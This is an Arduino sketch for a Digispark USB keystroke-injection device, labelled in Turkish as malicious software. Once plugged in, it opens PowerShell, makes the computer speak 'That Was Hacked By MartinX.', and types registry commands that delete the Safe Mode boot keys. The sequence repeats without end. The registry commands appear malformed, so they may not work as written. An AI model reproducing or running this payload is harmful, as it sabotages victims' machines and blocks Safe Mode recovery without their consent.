#define kbd_tr_tr
#include "DigiKeyboard.h"

void setup() {
  //Setup cods:

}

void loop() {
  
  //ZARARLI YAZILIM
  
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(100);
  //birinci kod
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(100);
  DigiKeyboard.print("powershell");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("Add-Type -AssemblyName System.speech");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  DigiKeyboard.print("$speak = New-Object System.Speech.Synthesis.SpeechSynthesizer");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  DigiKeyboard.print("$speak.Speak(\"That Was Hacked By MartinX.\")");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  //ikinci kod
  DigiKeyboard.print("@echo off");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  //ucuncu kod
  DigiKeyboard.print("reg delete HKLM/SYSTEM/currentcontrolset/control/safeboot/minimal/f > nul");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  //dortuncu kod
  DigiKeyboard.print("reg delete HKLM/SYSTEM/currentcontrolset/control/safeboot/network/f > nul");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);

}
